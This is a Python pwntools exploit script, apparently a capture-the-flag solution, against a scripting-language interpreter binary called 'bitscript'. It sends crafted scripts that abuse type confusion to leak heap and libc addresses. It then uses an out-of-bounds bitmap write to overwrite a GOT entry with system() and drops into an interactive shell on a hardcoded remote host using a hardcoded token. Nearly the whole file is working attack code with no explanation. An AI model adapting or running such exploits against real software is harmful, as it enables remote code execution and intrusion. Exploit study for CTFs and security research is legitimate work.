#!/usr/bin/env python3
from pwn import *

BIN_PATH = args.BINARY or "./bitscript"

exe = context.binary = ELF(BIN_PATH)
libc = exe.libc
#  context.log_level = "debug"  # uncomment while developing

HOST, PORT = "192.168.0.211", 9999
if os.getenv("container"):
    HOST = "host.containers.internal"
if os.getenv("SSH_CONNECTION"):
    HOST = "127.0.0.1"
TOKEN = "e0474f5b11ef48439fec9f14c439c514"


def start():
    if args.REMOTE:
        host = args.HOST or HOST
        port = int(args.PORT or PORT)
        token = args.TOKEN or TOKEN
        io = remote(host, port)
        io.sendlineafter(b"please input hash value: ", token)
        return io
    else:
        return process(BIN_PATH)

def send(io, code):
    io.sendlineafter(b':', str(len(code)).encode())
    io.send(code)

io = start()

code1 = b'''
print("=== Final RCE Exploit ===");

print("Step 1: Leak heap addresses");
int leak1 = 0;
string leak1 = "sh;st";
int addr1 = leak1;
print("addr1:");
print(addr1);

print("Step 2: Leak libc");
string v2 = "BBBBBBBB";
int v2 = 4231312;
int leaked = length(v2);
print("Leaked libc:");
print(leaked);

print("Step 4: Create bitmap");
bitmap b1 = create(9223372036854775807, 2);

print("Step 3: Create target variable");
int target = 0;
string target = "targetxx";
int targetaddr = target;
print("Target address:");
print(targetaddr);

print("Step 5: Calculate addresses");
int entryaddr = targetaddr - 768;
int valueptraddr = entryaddr + 40;
int bitmapptr = addr1 - 4096;
int offset = valueptraddr - bitmapptr;
int bitindex = offset * 8;
print("Calculated bit_index:");
print(bitindex);
print("Using this bit_index for write operations");

print("Step 6: Write printf@GOT to value_ptr");
print("printf@GOT = 0x409048");
print("Writing 64 bits starting at calculated bit_index...");
'''

code1 += f'set(b1, {0x90*8}, 0, 1);'.encode()

offset = 0x118 * 8
target = exe.got.free
target_str = bin(target)[2:].zfill(64)[::-1]
for i, v in enumerate(target_str):
    code1 += f'set(b1, {offset+i}, 0, {v});'.encode()

code1 += b'replace(target, 0, "AAA");'.replace(b"AAA", p64(0x405449)[:3])

pause()
send(io, code1)

io.recvuntil(b'libc:\n')
leak = int(io.recvline())
print(hex(leak))
libc.address = leak - libc.sym.setvbuf
print(hex(libc.address))

yyy = p64(libc.sym.system).strip(b'\0')
q = 'B' * len(yyy)

code2 = f'replace(target, 0, "{q}");'.encode().replace(q.encode(), yyy)

send(io, code2)

io.interactive()
